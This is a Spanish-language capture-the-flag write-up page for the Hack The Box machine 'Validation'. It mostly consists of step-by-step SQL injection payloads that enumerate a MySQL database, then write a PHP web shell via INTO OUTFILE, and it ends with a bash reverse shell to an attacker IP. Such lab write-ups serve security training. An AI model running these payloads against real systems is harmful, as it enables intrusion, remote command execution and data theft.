@@ -1,0 +1,107 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Validation HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/validation/pasted-20260224150118.png" alt="Validation HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Validation</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>sqli</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Explotación</code>: SQLI en el parámetro <code>country</code> para enumerar base de datos</li>
+            <li><code>Explotación</code>: Uso de <code>UNION SELECT</code> e <code>INTO OUTFILE</code> para escribir una webshell PHP</li>
+            <li><code>Escalada de Privilegios</code>: Acceso posterior mediante la shell web y credenciales del sistema</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: SQLI</h2>
+          <p>Interceptamos la petición con <code>burpsuite</code> y comenzamos a explotar SQLI</p>
+          <img class="writeup-image" src="/writeups/assets/validation/pasted-20260127181937.png" alt="Validation HTB" />
+          <img class="writeup-image" src="/writeups/assets/validation/pasted-20260127185401.png" alt="Validation HTB" />
+          <div class="code-card">
+            <h3>Modificamos ambos campos con &#x27; en busca de un error de la base de datos</h3>
+            <pre><code>username=alvruigut'&amp;country=Brazil 
+# 200 OK
+username=alvruigut&amp;country=Brazil'
+# Fatal Error: ... </code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Buscar número de columnas con order by 100</h3>
+            <pre><code>username=alvruigut&amp;country=Brazil' order by 100-- -
+# Fatal Error: ... -&gt; Aparece el mismo error. No Funciona ya que debe salir de error (Columna desconocida)</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Buscar número de columnas con union select hasta encontrar una respuesta válida</h3>
+            <pre><code>username=alvruigut&amp;country=Brazil' union select 1,2,3-- -
+# Fatal Error: ... 
+username=alvruigut&amp;country=Brazil' union select 1,2-- -
+# Fatal Error: ... 
+username=alvruigut&amp;country=Brazil' union select 1-- -
+# 200 OK -&gt; Hay una columna</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Listar la base de datos que ejecuta la consulta</h3>
+            <pre><code>username=alvruigut&amp;country=Brazil' union select database()-- -
+# registration
+
+# Si hubiese tres columnas ser operaría con tres argumentos: ' union SELECT 1,2,database()-- -</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Listar bases de datos</h3>
+            <pre><code>username=alvruigut&amp;country=Brazil' union select schema_name from information_schema.schemata-- -
+# information_schema
+# performance_schema
+# mysql
+# registration</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Listar tablas de la base de datos registration</h3>
+            <pre><code>username=alvruigut&amp;country=Brazil' union select table_name from information_schema.tables where table_schema="registration"-- -
+# La base de datos registration tiene la tabla registration</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Listar columnas de la tabla registration</h3>
+            <pre><code>username=alvruigut&amp;country=Brazil' union select column_name from information_schema.columns where table_schema="registration" and table_name="registration"-- -
+# La tabla registration tiene las columnas: username, userhash, country, regtime</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Listar datos de la tabla registration con el formato username:userhash</h3>
+            <pre><code>username=alvruigut&amp;country=Brazil' union select group_concat(username,0x3a,userhash) from registration-- -
+# Sin usuarios ni hashes relevantes</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Subir archivo php malicioso</h3>
+            <pre><code>username=alvruigut&amp;country=Brazil' union select "&lt;?php system($_REQUEST['cmd']); ?&gt;" into outfile "/var/www/html/shell.php"-- -
+# Acceder a http://&lt;ip_target&gt;/shell.php?cmd=whoami
+
+# bash -c "bash -i &gt;%26 /dev/tcp/10.10.17.227/444 0&gt;%261"</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>sqli</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
